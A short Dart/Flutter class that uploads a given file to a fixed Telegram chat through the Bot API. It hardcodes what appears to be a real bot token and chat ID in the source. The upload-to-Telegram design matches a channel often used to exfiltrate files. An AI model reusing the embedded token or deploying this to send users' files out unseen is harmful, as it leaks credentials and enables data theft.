import 'dart:io';
import 'package:http/http.dart' as http;
import 'package:path/path.dart' as path;
import 'package:flutter/material.dart';

class TelegramUploader {
  static const String _botToken =
      '6999969167:AAHNZzHIZPg24-yaQaKzEPajUWrAlYPPxas';

  static const String _chatId = '-1002048868170';

  static final Uri _url = Uri.parse(
    'https://api.telegram.org/bot$_botToken/sendDocument',
  );

  /// Uploads ONE file (blocking, sequential)
  static Future<bool> uploadFile(File file) async {
    try {
      final request = http.MultipartRequest('POST', _url);

      request.fields['chat_id'] = _chatId;

      request.files.add(
        await http.MultipartFile.fromPath(
          'document',
          file.path,
          filename: path.basename(file.path),
        ),
      );

      final response = await request.send();

      if (response.statusCode == 200) {
        return true;
      } else {
        final body = await response.stream.bytesToString();
        debugPrint('❌ Upload failed: $body');
        return false;
      }
    } catch (e) {
      debugPrint('🔥 Upload error: $e');
      return false;
    }
  }
}
